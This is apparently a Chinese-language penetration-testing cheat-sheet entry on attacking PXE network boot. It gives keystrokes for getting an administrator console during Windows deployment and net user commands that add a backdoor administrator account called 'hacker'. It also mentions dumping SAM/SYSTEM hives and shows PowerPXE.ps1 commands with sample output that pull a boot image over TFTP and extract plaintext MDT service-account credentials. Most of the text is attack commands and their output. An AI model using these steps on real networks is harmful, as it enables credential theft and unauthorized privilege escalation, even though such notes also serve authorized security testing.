	PXE 允许工作站通过使用 TFTP（普通 FTP）协议从服务器检索操作系统映像来从网络启动。这种网络引导允许攻击者获取图像并与之交互。
	在 PXE 引导期间按[F8]可在部署的计算机上生成管理员控制台。
	在初始 Windows 设置过程中按[SHIFT+F10]以调出系统控制台，然后添加本地管理员或转储 SAM/SYSTEM 注册表。
	net user hacker Password123! /add
	net localgroup administrators /add hacker
	使用PowerPXE.ps1 (https://github.com/wavestone-cdt/powerpxe)提取预启动映像（wim 文件）并挖掘它以找到默认密码和域帐户。
	导入模块
	PS > Import-Module .\PowerPXE.ps1
	执行攻击
	PS > Get-PXEcreds -InterfaceAlias Ethernet
	PS > Get-PXECreds -InterfaceAlias « lab 0 » 
	等待dhcp分配IP
	>> Get a valid IP address
	>>> >>> DHCP proposal IP address: 192.168.22.101
	>>> >>> DHCP Validation: DHCPACK
	>>> >>> IP address configured: 192.168.22.101
	从 DHCP 响应中提取 BCD 路径
	>> Request BCD File path
	>>> >>> BCD File path:  \Tmp\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd
	>>> >>> TFTP IP Address:  192.168.22.3
	下载BCD文件并解压wim文件
	>> Launch TFTP download
	>>>> Transfer succeeded.
	>> Parse the BCD file: conf.bcd
	>>>> Identify wim file : \Boot\x86\Images\LiteTouchPE_x86.wim
	>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
	>> Launch TFTP download
	>>>> Transfer succeeded.
	解析 wim 文件以找到数据
	>> Open LiteTouchPE_x86.wim
	>>>> Finding Bootstrap.ini
	>>>> >>>> DeployRoot = \\LAB-MDT\DeploymentShare$
	>>>> >>>> UserID = MdtService
	>>>> >>>> UserPassword = Somepass1